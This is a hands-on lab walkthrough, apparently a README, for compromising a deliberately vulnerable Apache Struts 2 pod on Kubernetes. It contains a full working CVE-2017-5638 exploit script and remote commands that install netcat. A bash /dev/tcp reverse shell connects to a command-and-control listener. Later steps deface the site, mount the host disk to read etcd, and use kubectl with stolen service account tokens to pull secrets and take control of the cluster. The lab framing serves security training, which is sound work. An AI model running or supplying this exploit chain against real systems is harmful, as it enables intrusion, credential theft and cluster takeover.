# Kubernetes Container Hack

## Exloiting a Vulnerability

Exploiting the Apache Struts 2 Java web framework CVE.

### Setup Vulnerable Target Container

Deploy Pod with vulnerable version:
```bash
kubectl apply -f vulnerable-pod.yaml
```

Access web application at http://localhost:30004 or http://struts-showcase.apache.com:30004.

### Setup Attacker Container

Using Kali Linux which is the most popular Linux distrobution for hacking.
```bash
docker pull kalilinux/kali-rolling
```

Run container:
```bash
docker run --name kali --rm -it kalilinux/kali-rolling /bin/bash
```

Install required libraries:
```bash
apt-get update && apt-get install -y curl nmap nikto python3 nano dnsutils
```

### Attack Reconnaissance

Scan network for open ports:
```bash
nmap -sT -p "80,135,443,445,30000-30100" host.docker.internal # this would be a CIDR range
```

Get the IP of the target:
```bash
nslookup host.docker.internal
```

Test for vulnerabilities and possible attacks using Nikto:
```
nikto -host 192.168.65.2:30004
```

Check attacker can access target:
```bash
# Replace the IP with the IP of your target container
curl http://192.168.65.2:30004/index.action
```

### Atack Target Container

We are now going to use the Apache Struts 2 CVE to exploit the container using **Strutsshock**.

An invalid Content-Type header is passed into a request which throws an error. The error is not escaped properly which allows us to inject additional commands which will be performed on the target machine.

Create Python script for strutshock attack:

```bash
nano attack.py
```

Copy following script:

```python
import http.client
import urllib.error
import urllib.parse
import urllib.request


def exploit(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib.request.Request(url, headers=headers)
        page = urllib.request.urlopen(request).read()
    except http.client.IncompleteRead as e:
        page = e.partial
    print(page)
    return page


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 3:
        print("[*] str.py <url> <cmd>")
    else:
        print('[*]CVE: 2017-5638 - Apache Struts2 S2-045')
        url = sys.argv[1]
        cmd = sys.argv[2]
        print(("[*] cmd: %s\n" % cmd))
        exploit(url, cmd)
```

Execute command on target - Remote Command Execution (RCE):

```bash
python3 attack.py http://192.168.65.2:30004/ "whoami"
python3 attack.py http://192.168.65.2:30004/ "curl www.google.com"
```

### Gain Reverse Shell Access

At this stage we can execute commands on the target machine. We want to go a step further by gaining a reverse shell into the container.

#### Create Command and Control Server

A Command and Control container will be created to gain shell access and execute commands on the target. This could be used in the future to manage the attack across other machines.

Run container:
```bash
docker run --name commandcontrol --rm -it -p 443:443 ubuntu /bin/bash
```

Install required libraries:
```bash
apt-get update && apt-get install -y ncat
```

Get IP of Apache container:
```bash
docker container inspect -f '{{ .NetworkSettings.IPAddress }}' commandcontrol
```

This IP will be used to establish command and control from the target in the next step. Firt we need to listen on the command and control server for a connection using netcat. We'll use port 443 because it is likely that it will be allowed outbound from the target already:

```bash
nc -lnvp 443
```

#### Get Reverse Shell on Target

From running a few commands we can see that the target vulnerable application is running as the root user on the target. This means we can do anything that we won't on the target and potentially on the host it is running on as well. We can also install any additional libraries that we need to setup command and control.

By running the following command we can see that it is running an old version of Debian Jessie:

```bash
python3 attack.py http://192.168.65.2:30004/ "apt-get update"
```

We can update the package manager sources so we can install additional libraries to exploit the target. We will install net can which will create a connection out to our command and control server.

```bash
python3 attack.py http://192.168.65.2:30004/ "sed -i \'s/deb.debian.org/archive.debian.org/g\' /etc/apt/sources.list"
python3 attack.py http://192.168.65.2:30004/ "apt-get update"
python3 attack.py http://192.168.65.2:30004/ "apt-get install -y --force-yes netcat"
```

Now that netcat is installed we can establish an outbound connection from our target to our command and control server. Since we are using port 443 it is likely that this traffic would be allowed outbound by the target's network:

```bash
python3 attack.py http://192.168.65.2:30004/ "bash -i >& /dev/tcp/192.168.65.2/443 0>&1"
```

We now have a reverse shell into the target.

Use the following in the command and control shell to allow clearing the console:
```bash
export TERM=xterm
```

We can see that this is a Docker host and running on Kubernetes:
```bash
ls -la
env
```

If we had mounted any secrets via Environment Variables we could now have access to them.

#### Make Changes to Target

Now that we have access we can make any change that we want to the system. This may include:

- Adding malware
- Creating a command and control server inside the target's network perimeter
- Deploying a worm
- Adding malware to their website being hosted
- Vandalizing the website
- Moving laterally within the target's network

The following can be used to make a change to the showcase screen which we have already found in our reconnaissance.

```bash
cd /usr/local/tomcat/webapps/ROOT
cat showcase.jsp
sed -i 's/Welcome!/You have been Hacked!/g' showcase.jsp
cat showcase.jsp
```

#### Bind to Host

If the pod is a privileged pod then it is possible to bind to the host's file system.

```bash
fdisk -l
mkdir /host
mount /dev/sda1 /host/
cd /host
cat etcd/member/snap/db
```

If the pod is on a master node then you will be able to see anything in etcd.

#### Kubectl

```bash
curl -LO -k "https://dl.k8s.io/release/$(curl -L -k -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
./kubectl
alias kubectl="./kubectl"
kubectl auth can-i --list
kubectl get secrets
kubectl get secret connectionstrings -o yaml
```

Trying using an existing service account.

If there is a service account secret available then it can also be used:

```bash
kubectl get secret admin-service-account-token -o yaml
export TOKEN=$(kubectl get secret admin-service-account-token -o yaml -ojsonpath='{.data.token}' | base64 -d)
alias kubectl="./kubectl --token=${TOKEN}"
```

At this point we have control of the whole cluster.

```bash
kubectl get pods -A
kubectl run nginx --image nginx
kubectl delete pod nginx
```

## Creating a Poisoned Image

Build Image:

```bash
docker build -t myapp .
```

Run Website:

```bash
kubectl apply -f poisoned-pod.yaml
```

Build Poisoned Image:

```bash
docker build -t myapp -f Dockerfile.poisoned .
```

Force Pull Poisoned Image:
```bash
kubectl rollout restart deploy myapp
```

## Detecting Application Vulnerabilities

```bash
snyk container test --app-vulns piesecurity/apache-struts2-cve-2017-5638:latest
```